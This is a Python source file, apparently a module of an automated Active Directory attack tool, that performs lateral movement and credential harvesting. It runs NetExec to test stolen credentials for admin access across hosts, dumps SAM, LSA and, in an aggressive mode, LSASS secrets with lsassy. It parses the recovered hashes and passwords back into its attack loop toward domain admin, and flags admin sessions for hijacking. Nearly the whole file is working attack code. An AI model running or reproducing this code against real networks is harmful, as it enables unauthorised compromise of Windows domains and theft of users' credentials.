"""Lateral movement and credential harvesting from compromised hosts.

For each credential, tests SMB/WinRM access across hosts, then on hosts where
we hold admin rights, dumps SAM/LSA/LSASS secrets to recover further
credentials (which feed back into the attack loop).
"""
from __future__ import annotations

import re
from pathlib import Path

from .base import BaseModule

NTHASH_RE = re.compile(r"[0-9a-fA-F]{32}")


class LateralModule(BaseModule):
    name = "lateral_movement"
    description = "Move laterally and harvest credentials from owned hosts"

    def run(self, workdir: Path) -> dict:
        hosts = list(self.state.hosts.keys())
        if not hosts:
            return {"pwned": 0}

        pwned = 0
        for cred in self.state.usable_credentials():
            if self.state.domain_admin_achieved:
                break
            targets = self._admin_access(cred, hosts)
            for ip in targets:
                self.log.ok("admin access on %s as %s", ip, cred.username)
                self.state.add_host(ip)
                pwned += 1
                self._dump_credentials(ip, cred)
                self._find_sessions(ip, cred)

        # After harvesting, retest whether we've become DA via DCSync
        return {"pwned": pwned}

    # ------------------------------------------------------------------
    def _nxc_auth(self, cred) -> list[str]:
        domain = cred.domain or self.state.domain
        args = ["-u", cred.username]
        if cred.password:
            args += ["-p", cred.password]
        elif cred.nthash:
            args += ["-H", cred.nthash]
        if domain:
            args += ["-d", domain]
        return args

    def _admin_access(self, cred, hosts: list[str]) -> list[str]:
        """Return hosts where this credential has admin access."""
        sample = hosts[:25]
        res = self.runner.run(
            [self.nxc_bin(), "smb", *sample, *self._nxc_auth(cred), "--no-bruteforce"],
            timeout=600, silent=True)
        pwned = []
        for line in res.out_lines:
            if "(Pwn3d!)" in line or "[+]" in line:
                ip = _line_ip(line)
                if ip:
                    pwned.append(ip)
                    cred.used = True
        return pwned

    # ------------------------------------------------------------------
    def _dump_credentials(self, ip: str, cred) -> None:
        """Dump SAM + LSA secrets (and LSASS if aggressive)."""
        base = [self.nxc_bin(), "smb", ip, *self._nxc_auth(cred)]

        # SAM
        res = self.runner.run([*base, "--sam"], timeout=600, silent=True)
        for user, nth in _parse_sam(res.stdout):
            self.state.add_credential(
                username=user, nthash=nth,
                domain=cred.domain or self.state.domain,
                source=f"SAM-{ip}")
            self.log.ok("recovered %s from SAM on %s", user, ip)

        # LSA (cached creds, service passwords)
        res = self.runner.run([*base, "--lsa"], timeout=600, silent=True)
        for user, nth in _parse_lsa(res.stdout):
            self.state.add_credential(
                username=user, nthash=nth,
                domain=cred.domain or self.state.domain,
                source=f"LSA-{ip}")

        # LSASS (only with --aggressive)
        if self.aggressive_enabled("lsass_dump"):
            res = self.runner.run([*base, "-M", "lsassy"], timeout=600, silent=True)
            for user, pwd in _parse_lsassy(res.stdout):
                self.state.add_credential(
                    username=user, password=pwd,
                    domain=cred.domain or self.state.domain,
                    source=f"LSASS-{ip}")

    def _find_sessions(self, ip: str, cred) -> None:
        """Look for high-privilege users with sessions on this host."""
        res = self.runner.run(
            [self.nxc_bin(), "smb", ip, *self._nxc_auth(cred), "--smb-sessions"],
            timeout=300, silent=True)
        for line in res.out_lines:
            low = line.lower()
            if "administrator" in low or "admin" in low:
                self.log_finding(
                    "high", "Privileged session detected",
                    line.strip(), host=ip,
                    technique="Session Hijacking")


# ----------------------------------------------------------------------
def _line_ip(line: str) -> str | None:
    parts = line.split()
    for p in parts:
        if re.match(r"\d{1,3}(\.\d{1,3}){3}", p):
            return p
    return None


def _parse_sam(text: str) -> list[tuple[str, str]]:
    """Parse nxc --sam output: DOMAIN\\user:rid:LM:NTHASH:::"""
    found = []
    for line in text.splitlines():
        if ":" not in line:
            continue
        parts = line.split(":")
        if len(parts) >= 4:
            user = parts[0].split("\\")[-1]
            lm, nt = parts[2], parts[3]
            if NTHASH_RE.fullmatch(nt) and nt != "31d6cfe0d16ae931b73c59d7e0c089c0":
                found.append((user, nt))
    return found


def _parse_lsa(text: str) -> list[tuple[str, str]]:
    found = []
    for line in text.splitlines():
        # cached or plaintext or service secrets with a 32-hex hash
        for m in NTHASH_RE.finditer(line):
            nth = m.group(0)
            if nth == "31d6cfe0d16ae931b73c59d7e0c089c0":
                continue
            # Try to associate a username from the same line
            user = "unknown"
            for token in line.split():
                if "\\" in token and ":" not in token:
                    user = token.split("\\")[-1]
                    break
            found.append((user, nth))
    return found


def _parse_lsassy(text: str) -> list[tuple[str, str]]:
    found = []
    for line in text.splitlines():
        # lsassy prints username and password/hash
        if "\\" in line:
            m = re.search(r"(\w+)\s*:\s*(.+)", line)
            if m:
                found.append((m.group(1).split("\\")[-1], m.group(2).strip()))
    return found
